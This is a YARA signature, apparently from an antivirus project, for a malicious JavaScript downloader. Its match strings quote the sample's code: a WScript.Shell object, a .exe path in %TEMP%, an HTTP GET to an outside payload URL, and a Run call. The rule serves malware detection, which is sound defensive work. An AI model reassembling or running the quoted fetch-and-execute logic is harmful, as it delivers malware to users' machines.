rule sig_20160328_91c5fcc176ed79ae26055ffee25b8899 {
  meta:
    description = "datamaliciousorder - file 20160328_91c5fcc176ed79ae26055ffee25b8899.js"
    author      = "HydraDragonAntivirus"
    reference   = "https://github.com/HydraDragonAntivirus"
    date        = "2026-04-26"
    hash1       = "9c50339ca5ea4854e0b8efb3e0bfc7b4debf626473c3f23f8ec26aa2c7f0b2e8"

  strings:
    $s1  = "function Tamheey() {return Nodztjyf[\"ExpandEnvironmentStrings\"](\"%TEMP%/\") + \"oGPevmRwUGU.exe\";};" fullword ascii
    $s2  = "Wnipnbzhj[Ieeaqd](\"GET\", \"http://themesbin.com/k9sjaf\", false);" fullword ascii
    $s3  = "do {WScript[Kxoijrijx](Whpscjc() * 11)} while (Wnipnbzhj[\"readystate\"] < 4 );" fullword ascii
    $s4  = "function Xehwkyqcdw(Mammxzg, Ptknfgoork){return Mammxzg - Ptknfgoork;};" fullword ascii
    $s5  = "var Nodztjyf = function Ahrxlh() {return WScript[Lspzzfyv](\"WScript.Shell\");}();" fullword ascii
    $s6  = "function Azith(Ogugxoxl){Nodztjyf[\"Run\"](Ogugxoxl, Wlkpq, Wlkpq);};" fullword ascii
    $s7  = "function Igqnpik() {return ((Zifys == true) && (Zifys == Vkugie)) ? 1 : Wlkpq;};" fullword ascii
    $s8  = " while (Zafwp){" fullword ascii
    $s9  = "function Htshtln()" fullword ascii
    $s10 = "Zifys = true; " fullword ascii
    $s11 = "function Czjkto(){return Lspzzfyv;};" fullword ascii
    $s12 = "var Vkugie = false;" fullword ascii
    $s13 = "return Xehwkyqcdw(Crbni, Kujseurl);" fullword ascii
    $s14 = "function Whpscjc(){return 22;};" fullword ascii
    $s15 = "Vkugie = true; " fullword ascii
    $s16 = "var Svpojf = false;" fullword ascii
    $s17 = "function Kjfnekhv(){return Qrpkgnu;};" fullword ascii
    $s18 = "var Zifys = false;" fullword ascii
    $s19 = "var Bkfutnz = new this[\"Date\"]();" fullword ascii
    $s20 = "} catch(Sbenqu){Zafwp = (\"asdfa\", \"fadfasdf\", \"afdafa\", 2);};" fullword ascii

  condition:
    uint16(0) == 0x6176 and
    8 of them
}